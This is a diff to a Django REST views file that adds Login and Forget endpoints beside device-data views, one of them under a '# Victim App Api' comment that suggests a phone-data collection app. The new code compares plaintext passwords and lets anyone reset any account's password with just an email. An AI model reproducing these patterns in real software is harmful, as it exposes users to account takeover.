@@ -1,7 +1,7 @@
 from rest_framework.views import APIView
 from rest_framework.response import Response
 from rest_framework import status
-from .seriallizers import Userserializers,Phonedataserializers
+from .seriallizers import Userserializers,Phonedataserializers,Forgetserializers
 from .models import User,Phonedata
 from django.http import JsonResponse
 from rest_framework.decorators import api_view
@@ -26,12 +26,35 @@ class Create_user(APIView):
                 serializer.save()
                 return JsonResponse({'data': serializer.data})
 
+class Login(APIView):
+    def post(self, request):
+        email = request.data['email']
+        password = request.data['password']
+        users = User.objects.all().filter(email=email)
+        serializer = Userserializers(users, many=True)
+        if serializer.data[0]['password'] == password:
+            return JsonResponse({'data': 'Login successful'})
+        else:
+            return JsonResponse({'data': 'Invalid credentials'})
+
+
+
+class Forget(APIView):
+    def post(self, request):
+        email = request.data['email']
+        newpassword = User.objects.get(email=email)
+        serializer = Forgetserializers(instance=newpassword, data=request.data)
+        if serializer.is_valid():
+            serializer.save()
+        return JsonResponse({'status':status.HTTP_200_OK})
+
+
+
 class Get_All_device(APIView):
     def post(self, request):
          phons = Phonedata.objects.all().filter(email = request.data['email'])
          serializer = Phonedataserializers(phons, many=True)
          return JsonResponse({'data': serializer.data})
-
 
 # Victim App Api
 class Phone_data_created(APIView):
